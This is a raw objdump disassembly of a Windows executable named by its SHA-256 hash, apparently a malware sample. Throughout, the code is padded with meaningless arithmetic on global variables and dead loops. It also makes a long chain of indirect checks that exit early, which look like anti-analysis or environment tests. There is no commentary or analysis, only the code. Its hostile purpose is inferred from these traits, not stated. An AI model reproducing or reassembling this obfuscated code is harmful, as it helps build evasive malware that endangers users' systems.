
4e6ab8e2088d4ce33d5e8325993484a7e52b59a0afe88fc7bea8ce42d4a1939c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x42d014,0x42a000
  401013:	push   esi
  401014:	movzx  esi,WORD PTR ds:0x429014
  40101b:	sub    DWORD PTR ds:0x42a018,esi
  401021:	mov    esi,DWORD PTR ds:0x42ed49
  401027:	push   0x8
  401029:	push   0x42e545
  40102e:	and    DWORD PTR ds:0x42c010,0x110f
  401038:	call   esi
  40103a:	test   eax,eax
  40103c:	mov    DWORD PTR ds:0x42a018,0x6e1c
  401046:	je     0x40105d
  40104c:	adc    DWORD PTR ds:0x42a014,0x429000
  401056:	xor    eax,eax
  401058:	jmp    0x4029a4
  40105d:	push   edi
  40105e:	push   0x42e555
  401063:	xor    edi,edi
  401065:	and    DWORD PTR ds:0x42c004,0x42d018
  40106f:	inc    edi
  401070:	push   edi
  401071:	push   edi
  401072:	call   DWORD PTR ds:0x42ed79
  401078:	xor    DWORD PTR ds:0x42d01c,0x429020
  401082:	test   eax,eax
  401084:	mov    DWORD PTR ds:0x42c004,0x42a7
  40108e:	je     0x4010a5
  401094:	xor    eax,eax
  401096:	mov    DWORD PTR ds:0x42a018,0x32e7
  4010a0:	jmp    0x4029a3
  4010a5:	sbb    DWORD PTR ds:0x42a010,0x2663
  4010af:	push   ebx
  4010b0:	and    DWORD PTR ds:0x42d008,0x0
  4010ba:	mov    ebx,DWORD PTR ds:0x42d008
  4010c0:	inc    ebx
  4010c1:	mov    DWORD PTR ds:0x42d008,ebx
  4010c7:	cmp    DWORD PTR ds:0x42d008,0xb
  4010ce:	jne    0x4010e4
  4010d4:	push   0x2cfb
  4010d9:	push   0x7de9
  4010de:	call   DWORD PTR ds:0x42ed35
  4010e4:	cmp    DWORD PTR ds:0x42d008,0xa
  4010eb:	jne    0x4010fe
  4010f1:	mov    ebx,DWORD PTR ds:0x42d008
  4010f7:	inc    ebx
  4010f8:	mov    DWORD PTR ds:0x42d008,ebx
  4010fe:	cmp    DWORD PTR ds:0x42d008,0x12
  401105:	jb     0x4010ba
  40110b:	mov    ebx,DWORD PTR ds:0x42ed4d
  401111:	push   0x42e565
  401116:	sub    DWORD PTR ds:0x429014,0x429020
  401120:	push   edi
  401121:	mov    DWORD PTR ds:0x42b01c,0x3048
  40112b:	push   edi
  40112c:	call   ebx
  40112e:	and    DWORD PTR ds:0x42c00c,0x5ead
  401138:	test   eax,eax
  40113a:	jne    0x401e1f
  401140:	push   0xc
  401142:	push   0x42e589
  401147:	adc    DWORD PTR ds:0x42c010,0x42d010
  401151:	call   esi
  401153:	test   eax,eax
  401155:	mov    DWORD PTR ds:0x42a01c,0x6b4c
  40115f:	jne    0x401e1f
  401165:	push   0x7
  401167:	push   0x42e59d
  40116c:	call   esi
  40116e:	xor    DWORD PTR ds:0x429028,0x6216
  401178:	test   eax,eax
  40117a:	jne    0x401e1f
  401180:	add    DWORD PTR ds:0x429004,0x14dc
  40118a:	push   0x8
  40118c:	and    DWORD PTR ds:0x42c00c,0x42a000
  401196:	push   0x42e5ad
  40119b:	add    DWORD PTR ds:0x42a018,0x317f
  4011a5:	call   esi
  4011a7:	test   eax,eax
  4011a9:	mov    DWORD PTR ds:0x42c014,0x304b
  4011b3:	jne    0x401e1f
  4011b9:	push   0x42e5bd
  4011be:	xor    DWORD PTR ds:0x42d014,0x42b004
  4011c8:	push   edi
  4011c9:	push   edi
  4011ca:	sub    DWORD PTR ds:0x429010,0x429028
  4011d4:	call   DWORD PTR ds:0x42ed79
  4011da:	not    DWORD PTR ds:0x42b000
  4011e0:	test   eax,eax
  4011e2:	mov    DWORD PTR ds:0x429008,0x4a9f
  4011ec:	jne    0x401e1f
  4011f2:	push   0x42e5cd
  4011f7:	push   edi
  4011f8:	adc    DWORD PTR ds:0x42d000,0x42900c
  401202:	push   edi
  401203:	call   ebx
  401205:	test   eax,eax
  401207:	jne    0x401e1f
  40120d:	xor    DWORD PTR ds:0x429000,0x429010
  401217:	push   0xc
  401219:	and    DWORD PTR ds:0x42b00c,0x6767
  401223:	push   0x42e5f1
  401228:	sub    DWORD PTR ds:0x42a010,0x429018
  401232:	call   esi
  401234:	sub    DWORD PTR ds:0x429010,0x42a010
  40123e:	test   eax,eax
  401240:	jne    0x401e1f
  401246:	push   0x7
  401248:	push   0x42e605
  40124d:	and    DWORD PTR ds:0x42c004,0x42b014
  401257:	call   esi
  401259:	test   eax,eax
  40125b:	mov    DWORD PTR ds:0x42c014,0x7e03
  401265:	jne    0x401e1f
  40126b:	and    DWORD PTR ds:0x429020,0x42d000
  401275:	push   0x8
  401277:	sbb    DWORD PTR ds:0x42a008,0x42901c
  401281:	push   0x42e615
  401286:	add    DWORD PTR ds:0x42c01c,0x42d010
  401290:	call   esi
  401292:	test   eax,eax
  401294:	mov    DWORD PTR ds:0x429008,0x7503
  40129e:	jne    0x401e1f
  4012a4:	push   0x42e625
  4012a9:	and    DWORD PTR ds:0x42d008,0x42c000
  4012b3:	push   edi
  4012b4:	push   edi
  4012b5:	call   DWORD PTR ds:0x42ed79
  4012bb:	or     DWORD PTR ds:0x42c01c,0x42d000
  4012c5:	test   eax,eax
  4012c7:	jne    0x401e1f
  4012cd:	add    DWORD PTR ds:0x42b018,0x42d004
  4012d7:	push   0x42e635
  4012dc:	and    DWORD PTR ds:0x42900c,0x42a018
  4012e6:	push   edi
  4012e7:	push   edi
  4012e8:	and    DWORD PTR ds:0x42c018,0x4f5c
  4012f2:	call   ebx
  4012f4:	xor    DWORD PTR ds:0x42b00c,0x577f
  4012fe:	test   eax,eax
  401300:	jne    0x401e1f
  401306:	push   0xc
  401308:	push   0x42e659
  40130d:	xor    DWORD PTR ds:0x429018,0x2dc5
  401317:	call   esi
  401319:	mov    DWORD PTR ds:0x42d014,0x790c
  401323:	test   eax,eax
  401325:	mov    DWORD PTR ds:0x42a014,0x2892
  40132f:	jne    0x401e1f
  401335:	sub    DWORD PTR ds:0x42d004,0x3ee1
  40133f:	push   0x7
  401341:	xor    DWORD PTR ds:0x42a01c,0x42b018
  40134b:	push   0x42e66d
  401350:	and    DWORD PTR ds:0x42c018,0x42d014
  40135a:	call   esi
  40135c:	test   eax,eax
  40135e:	mov    DWORD PTR ds:0x429008,0x4095
  401368:	jne    0x401e1f
  40136e:	sub    DWORD PTR ds:0x42d008,0x42b000
  401378:	push   0x8
  40137a:	adc    DWORD PTR ds:0x42d018,0x42c00c
  401384:	push   0x42e67d
  401389:	xor    DWORD PTR ds:0x42c014,0x7b1e
  401393:	call   esi
  401395:	test   eax,eax
  401397:	mov    DWORD PTR ds:0x42c010,0x4421
  4013a1:	jne    0x401e1f
  4013a7:	push   0x42e68d
  4013ac:	xor    DWORD PTR ds:0x42d018,0x31e9
  4013b6:	push   edi
  4013b7:	push   edi
  4013b8:	dec    DWORD PTR ds:0x42b010
  4013be:	call   DWORD PTR ds:0x42ed79
  4013c4:	test   eax,eax
  4013c6:	mov    DWORD PTR ds:0x429008,0x30d5
  4013d0:	jne    0x401e1f
  4013d6:	push   0x42e69d
  4013db:	push   edi
  4013dc:	adc    DWORD PTR ds:0x42c018,0x42d014
  4013e6:	push   edi
  4013e7:	sbb    DWORD PTR ds:0x429024,0x42b00c
  4013f1:	call   ebx
  4013f3:	xor    DWORD PTR ds:0x42b004,0x3165
  4013fd:	test   eax,eax
  4013ff:	mov    DWORD PTR ds:0x429028,0x3c76
  401409:	jne    0x401e1f
  40140f:	push   0xc
  401411:	or     DWORD PTR ds:0x42d000,0x42c004
  40141b:	push   0x42e6c1
  401420:	call   esi
  401422:	test   eax,eax
  401424:	mov    DWORD PTR ds:0x42d01c,0x6bbc
  40142e:	jne    0x401e1f
  401434:	and    DWORD PTR ds:0x42c018,0x24ff
  40143e:	push   0x7
  401440:	push   0x42e6d5
  401445:	add    DWORD PTR ds:0x42c008,0x429024
  40144f:	call   esi
  401451:	adc    DWORD PTR ds:0x429008,0x42b004
  40145b:	test   eax,eax
  40145d:	jne    0x401e1f
  401463:	push   0x8
  401465:	push   0x42e6e5
  40146a:	or     DWORD PTR ds:0x42a00c,0x2f15
  401474:	call   esi
  401476:	test   eax,eax
  401478:	jne    0x401e1f
  40147e:	push   0x42e6f5
  401483:	push   edi
  401484:	add    DWORD PTR ds:0x42a008,0x52fe
  40148e:	push   edi
  40148f:	call   DWORD PTR ds:0x42ed79
  401495:	sub    DWORD PTR ds:0x429018,0x42c010
  40149f:	test   eax,eax
  4014a1:	mov    DWORD PTR ds:0x42d014,0x5fc2
  4014ab:	jne    0x401e1f
  4014b1:	push   0x42e705
  4014b6:	add    DWORD PTR ds:0x42b014,0x42a00c
  4014c0:	push   edi
  4014c1:	push   edi
  4014c2:	xor    DWORD PTR ds:0x42b00c,0x37e4
  4014cc:	call   ebx
  4014ce:	mov    DWORD PTR ds:0x429000,0x2bcb
  4014d8:	test   eax,eax
  4014da:	jne    0x401e1f
  4014e0:	push   0xc
  4014e2:	push   0x42e729
  4014e7:	call   esi
  4014e9:	and    DWORD PTR ds:0x42b000,0x6be4
  4014f3:	test   eax,eax
  4014f5:	mov    DWORD PTR ds:0x42b00c,0x4954
  4014ff:	jne    0x401e1f
  401505:	or     DWORD PTR ds:0x429004,0x2e1b
  40150f:	push   0x7
  401511:	push   0x42e73d
  401516:	neg    DWORD PTR ds:0x429018
  40151c:	call   esi
  40151e:	or     DWORD PTR ds:0x429004,0x7cc8
  401528:	test   eax,eax
  40152a:	mov    DWORD PTR ds:0x42a000,0x4af4
  401534:	jne    0x401e1f
  40153a:	sub    DWORD PTR ds:0x429020,0x6067
  401544:	push   0x8
  401546:	push   0x42e74d
  40154b:	call   esi
  40154d:	test   eax,eax
  40154f:	jne    0x401e1f
  401555:	xor    DWORD PTR ds:0x429008,0x42a00c
  40155f:	push   0x42e75d
  401564:	push   edi
  401565:	sbb    DWORD PTR ds:0x42a004,0x429028
  40156f:	push   edi
  401570:	adc    DWORD PTR ds:0x42c000,0x42b004
  40157a:	call   DWORD PTR ds:0x42ed79
  401580:	xor    DWORD PTR ds:0x42b01c,0x42d004
  40158a:	test   eax,eax
  40158c:	mov    DWORD PTR ds:0x429004,0x6f0c
  401596:	jne    0x401e1f
  40159c:	sbb    DWORD PTR ds:0x429010,0x42b010
  4015a6:	push   0x42e76d
  4015ab:	push   edi
  4015ac:	xor    DWORD PTR ds:0x42c000,0x17e1
  4015b6:	push   edi
  4015b7:	add    DWORD PTR ds:0x429024,0x42b018
  4015c1:	call   ebx
  4015c3:	sbb    DWORD PTR ds:0x42c004,0x42b018
  4015cd:	test   eax,eax
  4015cf:	jne    0x401e1f
  4015d5:	or     DWORD PTR ds:0x42d008,0x42d000
  4015df:	push   0xc
  4015e1:	push   0x42e791
  4015e6:	adc    DWORD PTR ds:0x42d01c,0x429000
  4015f0:	call   esi
  4015f2:	test   eax,eax
  4015f4:	jne    0x401e1f
  4015fa:	sbb    DWORD PTR ds:0x42b01c,0x35f4
  401604:	push   0x7
  401606:	adc    DWORD PTR ds:0x42d00c,0x4213
  401610:	push   0x42e7a5
  401615:	xor    DWORD PTR ds:0x42b01c,0x728b
  40161f:	call   esi
  401621:	test   eax,eax
  401623:	mov    DWORD PTR ds:0x429010,0x1355
  40162d:	jne    0x401e1f
  401633:	add    DWORD PTR ds:0x42c00c,0x42d000
  40163d:	push   0x8
  40163f:	sub    DWORD PTR ds:0x42d000,0x42a014
  401649:	push   0x42e7b5
  40164e:	xor    DWORD PTR ds:0x42900c,0x42a014
  401658:	call   esi
  40165a:	add    DWORD PTR ds:0x42d018,0x7270
  401664:	test   eax,eax
  401666:	jne    0x401e1f
  40166c:	xor    DWORD PTR ds:0x429028,0x318
  401676:	push   0x42e7c5
  40167b:	not    DWORD PTR ds:0x42b00c
  401681:	push   edi
  401682:	and    DWORD PTR ds:0x429024,0x42d004
  40168c:	push   edi
  40168d:	call   DWORD PTR ds:0x42ed79
  401693:	test   eax,eax
  401695:	jne    0x401e1f
  40169b:	push   0x42e7d5
  4016a0:	push   edi
  4016a1:	push   edi
  4016a2:	xor    DWORD PTR ds:0x42d004,0x42b004
  4016ac:	call   ebx
  4016ae:	sbb    DWORD PTR ds:0x42d01c,0x42a008
  4016b8:	test   eax,eax
  4016ba:	mov    DWORD PTR ds:0x42b008,0x59c6
  4016c4:	jne    0x401e1f
  4016ca:	mov    DWORD PTR ds:0x42a008,0x78fc
  4016d4:	push   0xc
  4016d6:	add    DWORD PTR ds:0x42900c,0x42c018
  4016e0:	push   0x42e7f9
  4016e5:	call   esi
  4016e7:	test   eax,eax
  4016e9:	jne    0x401e1f
  4016ef:	and    DWORD PTR ds:0x42d010,0x3029
  4016f9:	push   0x7
  4016fb:	xor    DWORD PTR ds:0x42d008,0x429020
  401705:	push   0x42e80d
  40170a:	call   esi
  40170c:	sub    DWORD PTR ds:0x42901c,0x49cd
  401716:	test   eax,eax
  401718:	mov    DWORD PTR ds:0x42900c,0x2477
  401722:	jne    0x401e1f
  401728:	push   0x8
  40172a:	push   0x42e81d
  40172f:	call   esi
  401731:	or     DWORD PTR ds:0x42c000,0x42b014
  40173b:	test   eax,eax
  40173d:	jne    0x401e1f
  401743:	sub    DWORD PTR ds:0x429018,0x4202
  40174d:	push   0x42e82d
  401752:	adc    DWORD PTR ds:0x42a000,0x15e
  40175c:	push   edi
  40175d:	push   edi
  40175e:	and    DWORD PTR ds:0x42d008,0x1b79
  401768:	call   DWORD PTR ds:0x42ed79
  40176e:	add    DWORD PTR ds:0x42b008,0x42c000
  401778:	test   eax,eax
  40177a:	mov    DWORD PTR ds:0x429004,0x4fab
  401784:	jne    0x401e1f
  40178a:	add    DWORD PTR ds:0x42b008,0x429018
  401794:	push   0x42e83d
  401799:	push   edi
  40179a:	adc    DWORD PTR ds:0x42d018,0x42b008
  4017a4:	push   edi
  4017a5:	call   ebx
  4017a7:	adc    DWORD PTR ds:0x42b01c,0x42a014
  4017b1:	test   eax,eax
  4017b3:	mov    DWORD PTR ds:0x42b008,0x413c
  4017bd:	jne    0x401e1f
  4017c3:	sub    DWORD PTR ds:0x42a004,0x429004
  4017cd:	push   0xc
  4017cf:	push   0x42e861
  4017d4:	sub    DWORD PTR ds:0x42b014,0x419d
  4017de:	call   esi
  4017e0:	sub    DWORD PTR ds:0x429014,0x429024
  4017ea:	test   eax,eax
  4017ec:	mov    DWORD PTR ds:0x42c018,0x3584
  4017f6:	jne    0x401e1f
  4017fc:	adc    DWORD PTR ds:0x42b014,0x3845
  401806:	push   0x7
  401808:	adc    DWORD PTR ds:0x42b014,0x5918
  401812:	push   0x42e875
  401817:	call   esi
  401819:	or     DWORD PTR ds:0x42b004,0x42a000
  401823:	test   eax,eax
  401825:	jne    0x401e1f
  40182b:	sub    DWORD PTR ds:0x42c010,0x7a9b
  401835:	push   0x8
  401837:	push   0x42e885
  40183c:	call   esi
  40183e:	or     DWORD PTR ds:0x42b018,0x42a018
  401848:	test   eax,eax
  40184a:	mov    DWORD PTR ds:0x42c018,0x6db6
  401854:	jne    0x401e1f
  40185a:	push   0x42e895
  40185f:	push   edi
  401860:	push   edi
  401861:	or     DWORD PTR ds:0x429024,0x42b004
  40186b:	call   DWORD PTR ds:0x42ed79
  401871:	test   eax,eax
  401873:	jne    0x401e1f
  401879:	push   0x42e8a5
  40187e:	mov    DWORD PTR ds:0x42d010,0x708e
  401888:	push   edi
  401889:	mov    DWORD PTR ds:0x42c01c,0x7ef
  401893:	push   edi
  401894:	call   ebx
  401896:	test   eax,eax
  401898:	mov    DWORD PTR ds:0x42a00c,0x3b87
  4018a2:	jne    0x401e1f
  4018a8:	mov    DWORD PTR ds:0x429004,0x503
  4018b2:	push   0xc
  4018b4:	xor    DWORD PTR ds:0x42c00c,0x6b3b
  4018be:	push   0x42e8c9
  4018c3:	call   esi
  4018c5:	test   eax,eax
  4018c7:	mov    DWORD PTR ds:0x42a004,0x812
  4018d1:	jne    0x401e1f
  4018d7:	push   0x7
  4018d9:	sub    DWORD PTR ds:0x42b000,0x42a00c
  4018e3:	push   0x42e8dd
  4018e8:	sub    DWORD PTR ds:0x42d008,0x6a91
  4018f2:	call   esi
  4018f4:	add    DWORD PTR ds:0x429000,0x3ce6
  4018fe:	test   eax,eax
  401900:	mov    DWORD PTR ds:0x42d018,0x1a2
  40190a:	jne    0x401e1f
  401910:	sub    DWORD PTR ds:0x42a008,0x42a010
  40191a:	push   0x8
  40191c:	push   0x42e8ed
  401921:	call   esi
  401923:	sub    DWORD PTR ds:0x42d00c,0x42900c
  40192d:	test   eax,eax
  40192f:	mov    DWORD PTR ds:0x429000,0x18ec
  401939:	jne    0x401e1f
  40193f:	sbb    DWORD PTR ds:0x42a01c,0x42a004
  401949:	push   0x42e8fd
  40194e:	adc    DWORD PTR ds:0x42c010,0x1027
  401958:	push   edi
  401959:	adc    DWORD PTR ds:0x42d014,0x61c0
  401963:	push   edi
  401964:	xor    DWORD PTR ds:0x42d004,0x42b000
  40196e:	call   DWORD PTR ds:0x42ed79
  401974:	and    DWORD PTR ds:0x42b00c,0x54e0
  40197e:	test   eax,eax
  401980:	jne    0x401e1f
  401986:	mov    DWORD PTR ds:0x42b014,0x48d
  401990:	push   0x42e90d
  401995:	xor    DWORD PTR ds:0x42b00c,0x429000
  40199f:	push   edi
  4019a0:	xor    DWORD PTR ds:0x42c008,0x7d0d
  4019aa:	push   edi
  4019ab:	and    DWORD PTR ds:0x42b010,0xad4
  4019b5:	call   ebx
  4019b7:	adc    DWORD PTR ds:0x42b01c,0x42d018
  4019c1:	test   eax,eax
  4019c3:	mov    DWORD PTR ds:0x42a00c,0x2f29
  4019cd:	jne    0x401e1f
  4019d3:	sub    DWORD PTR ds:0x42a010,0x429014
  4019dd:	push   0xc
  4019df:	add    DWORD PTR ds:0x42d004,0x38f3
  4019e9:	push   0x42e931
  4019ee:	sub    DWORD PTR ds:0x42d008,0x531f
  4019f8:	call   esi
  4019fa:	xor    DWORD PTR ds:0x42a00c,0x1332
  401a04:	test   eax,eax
  401a06:	jne    0x401e1f
  401a0c:	add    DWORD PTR ds:0x42d014,0x42b000
  401a16:	push   0x7
  401a18:	push   0x42e945
  401a1d:	adc    DWORD PTR ds:0x429028,0x23cf
  401a27:	call   esi
  401a29:	test   eax,eax
  401a2b:	jne    0x401e1f
  401a31:	push   0x8
  401a33:	add    DWORD PTR ds:0x429020,0x607a
  401a3d:	push   0x42e955
  401a42:	call   esi
  401a44:	or     DWORD PTR ds:0x42c000,0x42b00c
  401a4e:	test   eax,eax
  401a50:	mov    DWORD PTR ds:0x42c00c,0x4ca0
  401a5a:	jne    0x401e1f
  401a60:	sub    DWORD PTR ds:0x429000,0x42d010
  401a6a:	push   0x42e965
  401a6f:	push   edi
  401a70:	and    DWORD PTR ds:0x42901c,0x42a004
  401a7a:	push   edi
  401a7b:	xor    DWORD PTR ds:0x42b018,0x42a008
  401a85:	call   DWORD PTR ds:0x42ed79
  401a8b:	adc    DWORD PTR ds:0x42d004,0x42901c
  401a95:	test   eax,eax
  401a97:	mov    DWORD PTR ds:0x42c010,0x64f7
  401aa1:	jne    0x401e1f
  401aa7:	push   0x42e975
  401aac:	mov    DWORD PTR ds:0x42a014,0x62f7
  401ab6:	push   edi
  401ab7:	push   edi
  401ab8:	call   ebx
  401aba:	add    DWORD PTR ds:0x42a018,0x42d01c
  401ac4:	test   eax,eax
  401ac6:	mov    DWORD PTR ds:0x42c01c,0x72ca
  401ad0:	jne    0x401e1f
  401ad6:	mov    DWORD PTR ds:0x42c01c,0x7760
  401ae0:	push   0xc
  401ae2:	sub    DWORD PTR ds:0x42b018,0x3ed8
  401aec:	push   0x42e999
  401af1:	call   esi
  401af3:	test   eax,eax
  401af5:	mov    DWORD PTR ds:0x42d018,0x4329
  401aff:	jne    0x401e1f
  401b05:	push   0x7
  401b07:	push   0x42e9ad
  401b0c:	call   esi
  401b0e:	add    DWORD PTR ds:0x42b01c,0x42d008
  401b18:	test   eax,eax
  401b1a:	jne    0x401e1f
  401b20:	add    DWORD PTR ds:0x42a008,0x5e0b
  401b2a:	push   0x8
  401b2c:	sub    DWORD PTR ds:0x429018,0x42a00c
  401b36:	push   0x42e9bd
  401b3b:	call   esi
  401b3d:	test   eax,eax
  401b3f:	mov    DWORD PTR ds:0x42d008,0x514f
  401b49:	jne    0x401e1f
  401b4f:	sbb    DWORD PTR ds:0x42b000,0x42d000
  401b59:	push   0x42e9cd
  401b5e:	xor    DWORD PTR ds:0x42c018,0x40e4
  401b68:	push   edi
  401b69:	add    DWORD PTR ds:0x42b010,0x42c000
  401b73:	push   edi
  401b74:	add    DWORD PTR ds:0x42d004,0x42c010
  401b7e:	call   DWORD PTR ds:0x42ed79
  401b84:	mov    DWORD PTR ds:0x42a000,0x51c5
  401b8e:	test   eax,eax
  401b90:	mov    DWORD PTR ds:0x42b000,0x17c8
  401b9a:	jne    0x401e1f
  401ba0:	and    DWORD PTR ds:0x42d014,0x42d010
  401baa:	push   0x42e9dd
  401baf:	push   edi
  401bb0:	push   edi
  401bb1:	call   ebx
  401bb3:	sbb    DWORD PTR ds:0x429010,0x42b014
  401bbd:	test   eax,eax
  401bbf:	mov    DWORD PTR ds:0x42c01c,0x73a3
  401bc9:	jne    0x401e1f
  401bcf:	xor    DWORD PTR ds:0x42c01c,0x6e0
  401bd9:	push   0xc
  401bdb:	adc    DWORD PTR ds:0x429008,0x42c008
  401be5:	push   0x42ea01
  401bea:	adc    DWORD PTR ds:0x42901c,0x2688
  401bf4:	call   esi
  401bf6:	add    DWORD PTR ds:0x42c008,0x63eb
  401c00:	test   eax,eax
  401c02:	mov    DWORD PTR ds:0x429004,0x7742
  401c0c:	jne    0x401e1f
  401c12:	adc    DWORD PTR ds:0x42c014,0x42b008
  401c1c:	push   0x7
  401c1e:	adc    DWORD PTR ds:0x42c008,0x42b010
  401c28:	push   0x42ea15
  401c2d:	call   esi
  401c2f:	test   eax,eax
  401c31:	mov    DWORD PTR ds:0x42900c,0x5c79
  401c3b:	jne    0x401e1f
  401c41:	adc    DWORD PTR ds:0x42d008,0x429000
  401c4b:	push   0x8
  401c4d:	xor    DWORD PTR ds:0x42c008,0x42b014
  401c57:	push   0x42ea25
  401c5c:	sub    DWORD PTR ds:0x42d000,0x42b01c
  401c66:	call   esi
  401c68:	xor    DWORD PTR ds:0x429008,0x42a00c
  401c72:	test   eax,eax
  401c74:	jne    0x401e1f
  401c7a:	push   0x42ea35
  401c7f:	adc    DWORD PTR ds:0x429020,0x1586
  401c89:	push   edi
  401c8a:	push   edi
  401c8b:	and    DWORD PTR ds:0x429008,0x42a014
  401c95:	call   DWORD PTR ds:0x42ed79
  401c9b:	and    DWORD PTR ds:0x42a01c,0x429000
  401ca5:	test   eax,eax
  401ca7:	jne    0x401e1f
  401cad:	push   0x42ea45
  401cb2:	push   edi
  401cb3:	sub    DWORD PTR ds:0x42d000,0x429000
  401cbd:	push   edi
  401cbe:	call   ebx
  401cc0:	test   eax,eax
  401cc2:	jne    0x401e1f
  401cc8:	push   0xc
  401cca:	push   0x42ea69
  401ccf:	sbb    DWORD PTR ds:0x42a004,0x42a014
  401cd9:	call   esi
  401cdb:	test   eax,eax
  401cdd:	mov    DWORD PTR ds:0x42a018,0x57a5
  401ce7:	jne    0x401e1f
  401ced:	sub    DWORD PTR ds:0x42d018,0x45f
  401cf7:	push   0x7
  401cf9:	push   0x42ea7d
  401cfe:	call   esi
  401d00:	test   eax,eax
  401d02:	mov    DWORD PTR ds:0x42a010,0x77f7
  401d0c:	jne    0x401e1f
  401d12:	adc    DWORD PTR ds:0x42a008,0x42900c
  401d1c:	push   0x8
  401d1e:	sub    DWORD PTR ds:0x429008,0x429014
  401d28:	push   0x42ea8d
  401d2d:	and    DWORD PTR ds:0x429008,0x429018
  401d37:	call   esi
  401d39:	test   eax,eax
  401d3b:	mov    DWORD PTR ds:0x429000,0x2cbb
  401d45:	jne    0x401e1f
  401d4b:	and    DWORD PTR ds:0x42d01c,0x42b000
  401d55:	push   0x42ea9d
  401d5a:	or     DWORD PTR ds:0x42b010,0x58c8
  401d64:	push   edi
  401d65:	or     DWORD PTR ds:0x42c00c,0x42a00c
  401d6f:	push   edi
  401d70:	adc    DWORD PTR ds:0x42b004,0x42a01c
  401d7a:	call   DWORD PTR ds:0x42ed79
  401d80:	and    DWORD PTR ds:0x429020,0x42b000
  401d8a:	test   eax,eax
  401d8c:	jne    0x401e1f
  401d92:	or     DWORD PTR ds:0x42c01c,0x42b01c
  401d9c:	push   0x42eaad
  401da1:	push   edi
  401da2:	push   edi
  401da3:	call   ebx
  401da5:	sbb    DWORD PTR ds:0x42901c,0x42c01c
  401daf:	test   eax,eax
  401db1:	mov    DWORD PTR ds:0x429018,0x129d
  401dbb:	jne    0x401e1f
  401dc1:	sbb    DWORD PTR ds:0x42a004,0x14a1
  401dcb:	push   0xc
  401dcd:	push   0x42ead1
  401dd2:	call   esi
  401dd4:	sbb    DWORD PTR ds:0x42c00c,0x67e3
  401dde:	test   eax,eax
  401de0:	mov    DWORD PTR ds:0x42c014,0x5d4a
  401dea:	jne    0x401e1f
  401df0:	sbb    DWORD PTR ds:0x42c00c,0x7769
  401dfa:	push   0x7
  401dfc:	or     DWORD PTR ds:0x42b00c,0x1035
  401e06:	push   0x42eae5
  401e0b:	call   esi
  401e0d:	test   eax,eax
  401e0f:	mov    DWORD PTR ds:0x42d014,0xf4
  401e19:	je     0x401e3a
  401e1f:	sub    DWORD PTR ds:0x42b01c,0x42b000
  401e29:	xor    eax,eax
  401e2b:	mov    DWORD PTR ds:0x42c018,0x7f86
  401e35:	jmp    0x4029a2
  401e3a:	or     esi,DWORD PTR ds:0x429020
  401e40:	mov    DWORD PTR [ebp-0x10],0x0
  401e47:	movzx  esi,BYTE PTR ds:0x42d010
  401e4e:	add    DWORD PTR ds:0x42c004,esi
  401e54:	mov    eax,DWORD PTR [ebp-0x24]
  401e57:	dec    esi
  401e58:	mov    DWORD PTR [ebp-0x24],eax
  401e5b:	mov    ecx,0xf89c85b5
  401e60:	mov    edi,DWORD PTR ds:0x411fc4
  401e66:	mov    esi,DWORD PTR ds:0x411f58
  401e6c:	sub    esi,edi
  401e6e:	imul   edi,DWORD PTR [edi+esi*1]
  401e72:	mov    DWORD PTR [ebp-0x8],ecx
  401e75:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  401e7c:	and    DWORD PTR ds:0x42a004,0x0
  401e86:	jmp    0x401e98
  401e8b:	mov    edi,DWORD PTR ds:0x42a004
  401e91:	inc    edi
  401e92:	mov    DWORD PTR ds:0x42a004,edi
  401e98:	cmp    DWORD PTR ds:0x42a004,0x1c
  401e9f:	jae    0x401ed2
  401ea5:	cmp    DWORD PTR ds:0x42a004,0x25
  401eac:	jne    0x401ec3
  401eb2:	push   DWORD PTR [ebp-0x14]
  401eb5:	push   0x42a004
  401eba:	push   DWORD PTR [ebp-0x1c]
  401ebd:	call   DWORD PTR ds:0x42ed39
  401ec3:	jmp    0x401e8b
  401ec8:	sbb    DWORD PTR ds:0x42d000,0x3f97
  401ed2:	lea    eax,[ebp-0x34]
  401ed5:	mov    DWORD PTR [ebp-0x28],eax
  401ed8:	mov    esi,DWORD PTR ds:0x429018
  401ede:	and    esi,DWORD PTR ds:0x42901c
  401ee4:	mov    DWORD PTR ds:0x429018,esi
  401eea:	lea    eax,[ebp-0x30]
  401eed:	mov    DWORD PTR [ebp-0x1c],eax
  401ef0:	sub    DWORD PTR ds:0x429018,0x2a07
  401efa:	mov    eax,ds:0x42e435
  401eff:	mov    eax,DWORD PTR [eax+0x1c8]
  401f05:	or     DWORD PTR ds:0x429028,0x42b010
  401f0f:	mov    eax,DWORD PTR [eax]
  401f11:	mov    edx,DWORD PTR [ebp-0x1c]
  401f14:	mov    esi,0x7510896
  401f19:	adc    DWORD PTR ds:0x429014,edi
  401f1f:	xor    eax,esi
  401f21:	mov    edi,0x3272dd
  401f26:	add    eax,edi
  401f28:	mov    DWORD PTR ds:0x42d008,0xdc
  401f32:	mov    DWORD PTR [edx],eax
  401f34:	mov    eax,ds:0x42b000
  401f39:	mov    eax,ds:0x42ebcd
  401f3e:	cmp    eax,0x312bc9f6
  401f43:	jne    0x40206d
  401f49:	xor    eax,0x6ec6
  401f4e:	mov    eax,DWORD PTR [ebp-0x8]
  401f51:	mov    edx,DWORD PTR ds:0x42e435
  401f57:	or     DWORD PTR ds:0x42901c,0x3e24
  401f61:	mov    edx,DWORD PTR [edx+0x198]
  401f67:	or     DWORD PTR ds:0x42b018,edx
  401f6d:	xor    eax,esi
  401f6f:	and    ebx,0x7b5c
  401f75:	add    eax,edi
  401f77:	and    DWORD PTR ds:0x429028,0x0
  401f81:	jmp    0x401f93
  401f86:	mov    ebx,DWORD PTR ds:0x429028
  401f8c:	inc    ebx
  401f8d:	mov    DWORD PTR ds:0x429028,ebx
  401f93:	cmp    DWORD PTR ds:0x429028,0x10
  401f9a:	jae    0x401fc8
  401fa0:	cmp    DWORD PTR ds:0x429028,0x12
  401fa7:	jne    0x401fbd
  401fad:	push   0x42e010
  401fb2:	push   0x42e0c5
  401fb7:	call   DWORD PTR ds:0x42ed3d
  401fbd:	jmp    0x401f86
  401fc2:	sub    DWORD PTR ds:0x42c014,edx
  401fc8:	mov    DWORD PTR [edx],eax
  401fca:	sbb    DWORD PTR ds:0x42c014,edi
  401fd0:	mov    eax,DWORD PTR [ebp-0x8]
  401fd3:	mov    DWORD PTR ds:0x42c018,0x1d
  401fdd:	cmp    DWORD PTR ds:0x42c018,0x0
  401fe4:	je     0x402064
